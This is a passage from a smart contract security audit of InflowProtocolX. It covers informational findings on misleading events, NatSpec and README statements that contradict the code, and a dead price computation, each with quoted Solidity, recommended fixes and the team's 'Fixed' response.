All effects are off-chain. Indexers that count `Deployed` events over-count deployments, and a LiquidityDeployer that has silently stopped placing LP still looks healthy from its `Deployed` events, for example because the reserve wallet is empty or has not approved the module; `CycleExecuted` does carry the true `deployed` flag (`VaultController.sol:625`). Readers of the `_ipxForStable()` NatSpec misjudge which cap bounds the seed leg. Operators misread why a rail was skipped, and indexers that treat `ExpansionActivated` as an activation count a new one on every cycle that places a rail slice. Indexers and dashboards that rebuild the exempt set from logs miss the three constructor entries and record transitions that never happened, although the true state can still be read from `isFeeExempt`. Off-chain reconciliation that relies on `PolDepositorsReceived.count` over-counts the registry, although every real addition still emits `PolDepositorAdded`.

Several of these events fire in ordinary operation (`ExpansionActivated` on every rail slice, `FeeExemptionSet` on every rotation), while others need an empty or unapproved reserve wallet, an unsynced transfer or overlapping registries. In every case, on-chain state, accounting and fund flow are correct and the true state is recoverable from `CycleExecuted.deployed`, `isFeeExempt` and `PolDepositorAdded`, so only off-chain data and comments are affected and this is Informational.

## Recommendation

1. In LiquidityDeployer, add the placed USD or `didDeploy` to `Deployed` (or skip the event when nothing was placed), and emit `LpLegDeclined` on the silent zero exits (reserve clamp, zero-ratio pair, surplus clamp). Correct the `_ipxForStable()` NatSpec to name the proportional scaling; its fail-closed wording is addressed in I-15. If the third fix in I-11 is adopted, so that `deploy()` also reports success when a leg minted only dust LP, gate or populate `Deployed` on that same condition rather than on the placed USD, so the event and the returned flag cannot disagree.
2. Use a distinct event or reason code for each skip cause, and choose the one-sided or preloaded label from the pair's actual state, including LP supply. Rename the `twapIpx` field, or fix the NatSpec to describe the route-chain value it carries. Declare `RailAddressUpdated(uint256 indexed idx, string name, address indexed addr)`. Emit a separate `RailContributed` event from `contributeToRail()`, and update the LiquidityDeployer comment that points readers to `ExpansionActivated` for rail contributions (`src/LiquidityDeployer.sol:305-306`). ExpansionModule has almost no bytecode headroom (`src/ExpansionModule.sol:345-348`), so check its size after these changes; a reason code on the existing skip event costs less than new event types.
3. Emit `FeeExemptionSet` for the three constructor grants, and return early from `_setExemption()` when `isFeeExempt[account] == exempt`.
4. Make `_appendPolDepositor()` return whether it appended, and emit the number of entries actually added. Alternatively, rename the event field to `submitted`.

## Team Response

Fixed.

# [I-20] Documentation and NatSpec Contradict the Code, and `_addLiquidityStable()` Carries a Dead Computation

## Severity

Informational Risk

## Description

In several places, the README, the audit brief, NatSpec or code comments describe something other than what the code does, and one function computes a value it throws away, none of this changes on-chain behaviour, but each point misleads the operators, integrators or reviewers who rely on the documentation.

### 1. One global locker `unlockTime`, not 5,555 days from each position's creation

The LiquidityDeployer and ExpansionModule comments say new LP is "custodied under the 5,555-day lock from the moment it's created" (`LiquidityDeployer.sol:590-592`, `ExpansionModule.sol:800-802`), which can mean the locker's lock but also reads as a full 5,555-day lock for each position. `Locker` sets one global `unlockTime` in its constructor and `deposit()` records no release time, so all POL unlocks on one date about 15.2 years after the locker's deployment and later LP is locked for less time, as the README's "same 5,555-day lock horizon" (`README.md:192-193`) correctly says; only the two module comments are ambiguous. What follows expiry is documented in the `Locker` header (`Locker.sol:18-25`) and controlled only by the immutable multisig: `relock()` is gated by `postUnlock`, so the lock cannot be extended early, and LP deposited after `unlockTime` is withdrawable until the multisig calls `relock()`.

### 2. A 200-wei sell passes the `sellTax > 0` trigger gate, so the "real inflow" comment overstates it

In `IPXToken._update()`, the sell tax rounds down, so at the default 50 bps a 200-wei transfer into a flagged pair pays 1 wei of tax (200 × 50 / 10,000 = 1), passes the `sellTax > 0` gate and calls `checkAndExecute()`; the other 199 wei land on the pair as an unsynced balance, so a trigger costs at most 200 wei of IPX plus gas. The comment above the trigger says requiring real sell tax "ties every cycle to a real inflow into the vault", but that inflow can be 1 wei: the VaultController NatSpec states the real cost, "anyone can run a cycle with a few wei of IPX" (`VaultController.sol:57-58`), and a comment in `_runCycle()` still names `transfer(pair, 0)` as the cheap trigger although a zero-value transfer no longer runs the cycle (`VaultController.sol:531-535`). Dust cycles are actually held back by the conversion cooldown and the `ipxConverted > 0` gating (`VaultController.sol:529`, `:590-591`), not by the trigger, and the near-free trigger is what L-05 relies on.

### 3. The `TWAP_SKEW_DIVISOR` rationale overstates the move needed (about 23%, not 72%)

The NatSpec on `TWAP_SKEW_DIVISOR = 24` weights the skew head at 1/24 (a full-window span) against the 3% zone threshold and concludes that faking a confirmation through pin skew needs a 72% move (24 × 3%); the `_twapZone()` NatSpec uses a half-window span but still the 3% threshold, giving its "36x" figure (12 × 3) (`ArbitrageMonitor.sol:378-383`). The TWAP leg actually confirms at `ARB_NEUTRAL_BPS` (1.8%, `ArbitrageMonitor.sol:437`, `:440`), and `_liveSpansUsable()` accepts a shortest span of half a window (`ArbitrageMonitor.sol:487`), so the span holding a W/24 head can be as short as W/2 + W/24, the head weighs up to 1/13, and a move of about 13 × 1.8% ≈ 23.4% over the head is enough (12 × 1.8% = 21.6% with the comments' half-window rounding), about a third of the documented 72%. This applies only without a registered base set: the deploy script registers one (`Deploy.s.sol:310`), after which `_updateBaseSet()` pins all three pairs together (`TWAPOracle.sol:350-365`), so the gap exists only while the set is dissolved, for example between `removePair()` and `setBasePairs()` in a migration.

### 4. `lastWplsStablePriceQ` is documented as 1e18-scaled but stores a 1e30-scaled value

The public `lastWplsStablePriceQ` is labelled "stable-wei per WPLS-wei × 1e18" (`VaultController.sol:90-91`), but all three writers (`VaultController.sol:466`, `:598`, `:1508`) store `_wplsStablePriceQ()`, which uses the 1e30 `WPLS_STABLE_Q_SCALE` (`VaultController.sol:1441-1455`). On-chain use is consistent because the guard compares the value with another `_wplsStablePriceQ()` reading, but an off-chain reader who trusts the comment is off by a factor of 1e12. The neighbouring `launchWplsStableQ` already documents the correct scale (`VaultController.sol:77`).

### 5. Contract-level NatSpec says the cycle runs on every transfer

The `IPXToken` header promises "a cycle hook into VaultController on every transfer" (`IPXToken.sol:12-13`), and the VaultController header says it "runs the 11-step cycle on every taxable transfer" (`VaultController.sol:24-25`). The token's only call site requires a sell (`isSell && !isBuy`) that paid sell tax, outside `inSwap`, with a vault controller set (`IPXToken.sol:436`), so buys, peer-to-peer transfers, fee-exempt transfers and router hops never run the cycle, even though buys are taxable. The NatSpec inside `_update()` describes this correctly (`IPXToken.sol:364-374`), as do the README (`README.md:359-361`) and the audit brief (`AUDIT_BRIEF.md:109-110`).

### 6. `addPair()` NatSpec promises a `consult()` fallback that does not exist

The `addPair()` NatSpec says a pair that has been accruing since before registration can be read through "a `consult()` fallback path" (`TWAPOracle.sol:178-182`). `consult()` has no such path: it reverts with `NoTWAPYet` while the snapshot's `lastUpdateAt` is zero, however long the pair has been accruing on the DEX (`TWAPOracle.sol:448-450`), and its own NatSpec states this correctly.

### 7. The README and the audit brief list a `VaultController.setReserveWallet()` that does not exist

`README.md:309` lists `*.setReserveWallet(address)` "on VaultController, LiquidityDeployer, ExpansionModule", and `AUDIT_BRIEF.md:61` lists `VaultController.setReserveWallet(address)` among the owner controls. At 02494aa, only `LiquidityDeployer.sol:120` and `ExpansionModule.sol:247` define the setter; VaultController has none and, as its own comment says, holds no reserve-wallet reference (`VaultController.sol:42-44`). An operator rotating the reserve wallet from the documentation looks for a third call that does not exist; the two module setters are the whole rotation, which is what `Deploy.s.sol:200-201` and `docs/MIGRATION_PLAYBOOK.md:263-264` call.

### 8. The brief says exempt transfers still pay tax to the vault, but an exemption removes the tax

`AUDIT_BRIEF.md:54` describes `IPXToken.setFeeExempt(account, exempt)` as "flips fee exemption; taxed transfers to/from exempt accounts still route tax to the vault". The token does the opposite: `_update()` computes `bool isBuy  = isPair[from] && !isFeeExempt[to] && !isFeeExempt[from];` and `bool isSell = isPair[to]   && !isFeeExempt[from] && !isFeeExempt[to];` (`IPXToken.sol:393-394`), and takes tax only when one of them is true (`IPXToken.sol:410-411`). A transfer with an exempt party on either side therefore pays no tax at all and, because `isSell` is false, does not run the cycle, so a reader of the brief underestimates what an exemption grants.

### 9. The brief's "exhaustive" owner list omits the TWAPOracle registry setters

`AUDIT_BRIEF.md:66` calls the post-launch owner list "exhaustive", but the list (`AUDIT_BRIEF.md:53-64`) names no `TWAPOracle` function, although the multisig keeps the oracle after launch (`docs/MIGRATION_PLAYBOOK.md:19`). Its owner-only registry setters, which have no lock gates, are missing: `addPair()` (`TWAPOracle.sol:183`), `removePair()` (`:296-308`), which also dissolves the base set when it removes a member, and `setBasePairs()` (`:205-228`), which registers or replaces the set and restarts all three base windows; the migration playbook calls all three. The oracle's other owner setters, `setVaultController()` (`:239`), `setWindowSeconds()` (`:158`) and `setMaxTwapStaleness()` (`:254`), are missing too, and the README's owner list (`README.md:295-312`) names only `setWindowSeconds()`; the levers the brief omits on other contracts are covered in I-17.

### 10. Dead `_usdcToIpx()` computation in `_addLiquidityStable()`

`_addLiquidityStable()` prices `usdValue` in IPX through `_usdcToIpx()` (the WPLS/stable anchor and the IPX/WPLS pool), uses the result only in an `ipxAmount == 0` check, and two lines later overwrites it with `_ipxToMatchStable()`, which prices from the IPX/stable pair the leg actually deposits into and has its own zero check. Each run therefore makes up to eight external view calls whose result is thrown away (two pair lookups on the VaultController, plus `getReserves()`, `token0()` and `token1()` on two pairs; `LiquidityDeployer.sol:638-662`), and the stable leg carries a silent decline condition tied to two pools it does not trade on, which is dead while both pools hold liquidity.

## Location of Affected Code

One unlock time is set at deployment, and a deposit sets no release time:

File: [src/lockers/Locker.sol#L82-L94](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/lockers/Locker.sol#L82-L94)

```solidity
    initialUnlockTime = block.timestamp + _initialLockDuration;
    unlockTime = initialUnlockTime;
// code
function deposit(address token, uint256 amount) external {
    if (token == address(0)) revert ZeroAddress();
    if (amount == 0) return;
    depositedBy[token][msg.sender] += amount;
    IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
    emit Deposited(token, msg.sender, amount);
}
```

The sell tax rounds down, and the trigger only needs it to be non-zero:

File: [src/IPXToken.sol#L413-L438](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol#L413-L438)

```solidity
    if (isSell) sellTax = ((value - buyTax) * sellTaxBps) / InflowConstants.BPS_DENOMINATOR;
// code
if (isSell && !isBuy && sellTax > 0 && !inSwap && vaultController != address(0)) {
```

The skew divisor's rationale:

File: [src/ArbitrageMonitor.sol#L130-L134](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ArbitrageMonitor.sol#L130-L134)

```solidity
/// @dev `maxWindowSkew()` is the oracle window divided by this. At
///      24 the phantom gap a tolerated skew can produce is 1/24 of
///      the price motion across the window (see `_twapZone`), so
///      the 3% zone threshold needs a 72% move to fake.
uint256 internal constant TWAP_SKEW_DIVISOR = 24;
```

The controller holds no reserve wallet, although the README and the brief list a `VaultController.setReserveWallet()`:

File: [src/VaultController.sol#L42-L44](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L42-L44)

```solidity
// The reserve wallet is set (and read) on LiquidityDeployer and
// ExpansionModule directly - those modules pull reserve IPX and
// route rail leftovers, so VC holds no reserve-wallet reference.
```

The first `ipxAmount` is read only by the zero check and then overwritten:

File: [src/LiquidityDeployer.sol#L525-L535](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/LiquidityDeployer.sol#L525-L535)

```solidity
uint256 ipxAmount    = _usdcToIpx(usdValue);

// The plan sizes this leg inside the stable budget, so this bound
// cannot bind from `deploy`; it keeps the leg from ever reaching
// into the floor or the protected seed.
uint256 stableAvail = IVaultController(vaultController).getStableSurplus();
if (stableAmount > stableAvail) stableAmount = stableAvail;
if (stableAmount == 0 || ipxAmount == 0) return 0;

ipxAmount = _ipxToMatchStable(stableAmount, pair);
if (ipxAmount == 0) return 0;
```

## Impact

Each point misleads whoever relies on the documentation, and none changes on-chain behaviour. Holders who read the module comments may overestimate how long late POL stays locked, although only the immutable multisig can withdraw, so no third party can use the gap. Readers of the token comment assume each cycle costs a real inflow when it costs one wei, while the cooldown and the `ipxConverted > 0` gating keep dust cycles from advancing conversion state. The documented skew margin is about three times the real one, but only while the oracle has no registered base set. Dashboards that apply the documented scale misread the guard reference by 1e12. Integrators may expect a buy to run the cycle, or a `consult()` to succeed before the first pin, when the real behaviour fails closed. Operators following the README or the brief look for a reserve-wallet setter that does not exist, reviewers who read the brief's `setFeeExempt()` entry believe an exemption still routes tax to the vault when it removes the tax and the cycle trigger entirely, and reviewers who trust the brief's exhaustive owner list miss the oracle setters that decide which pairs are tracked and whether the base set is pinned together. The stable leg wastes gas on a discarded computation.

Every item is a documentation, NatSpec or dead-code mismatch with no on-chain effect; harm needs a reader to act on the wrong text, and item 3 matters only after an owner dissolves the base set. No funds are affected, so this is Informational.

## Recommendation

1. Correct the LiquidityDeployer NatSpec and the ExpansionModule comment to describe a single lock that ends at `LpLocker.unlockTime`. Optionally, let `relock()` extend the lock before it expires, so the multisig can keep the lock ahead of new deposits. Before expiry, it must accept only a value later than the current `unlockTime`: checking against `block.timestamp`, as `relock()` does today, would let an early call shorten the lock, which is the early-unlock path the `Locker` header rules out (`src/lockers/Locker.sol:16`). `Locker` is also the base of `TeamLocker`, so the change would let the multisig extend the team allocation's lock too; implement it in `LpLocker` alone if that is not intended. Bound the new time, for example, at or near the longest initial lock duration, so a mistyped value cannot lock the POL indefinitely.
2. Correct the "real inflow" sentence in `IPXToken._update()` and the `transfer(pair, 0)` comment in `_runCycle()` to say that any sell paying at least 1 wei of sell tax (200 wei at 50 bps) runs the cycle. Do not add a minimum `value` to the trigger to make it costly. Today a plain sell runs any due round before its own IPX reaches the pair (`src/IPXToken.sol:436-443`), so it cannot move the price ahead of that round. At a minimum, a seller could split a push into sells below it, moving the pool without running the cycle, and small sells would stop re-pinning the oracle windows that the cycle refreshes (`src/VaultController.sol:601-609`). Dust cycles are already held back by the cooldown and the `ipxConverted > 0` gating, and the sandwich use of the cheap trigger is addressed directly by the fix in L-05.
3. Fix the arithmetic in both comments to use the 1.8% confirmation threshold and the shortest span the monitor accepts, which gives about 23% over the head. If the documented 72% margin is the design target for an oracle without a base set, raise `TWAP_SKEW_DIVISOR` to about 80 to match. The cost is a tighter pin tolerance, about 45 seconds at the one-hour window, so while the set is dissolved, pairs pinned in separate transactions would more often read as no signal and the monitor would confirm no zone (the fail-closed side) until they line up again. Update the `maxWindowSkew()` note in `docs/MIGRATION_PLAYBOOK.md` accordingly.
4. Correct the comment to the stored scale: "stable-wei per WPLS-wei × 1e30" (`WPLS_STABLE_Q_SCALE`).
5. Reword both headers, for example: "runs the cycle on taxed sells that are not router hops (see `IPXToken._update()`) and on the keeper's `poke()`".
6. Remove the parenthetical about a `consult()` fallback from the `addPair()` NatSpec.
7. Remove VaultController from the `setReserveWallet()` entries in `README.md:309` and `AUDIT_BRIEF.md:61`.
8. Correct the `setFeeExempt()` entry in `AUDIT_BRIEF.md:54`: a transfer with an exempt party on either side is untaxed and, for a sell, does not run the cycle.
9. Add the `TWAPOracle` owner functions (`addPair()`, `removePair()`, `setBasePairs()`, `setVaultController()`, `setWindowSeconds()`, `setMaxTwapStaleness()`) to the brief's owner list, noting that `removePair()` dissolves the base set, or drop the claim that the list is exhaustive.
10. Delete the `_usdcToIpx()` call at `LiquidityDeployer.sol:525` and drop the `ipxAmount == 0` operand at line 532. The check at line 535 already covers the value the leg actually uses.

## Team Response

Fixed.
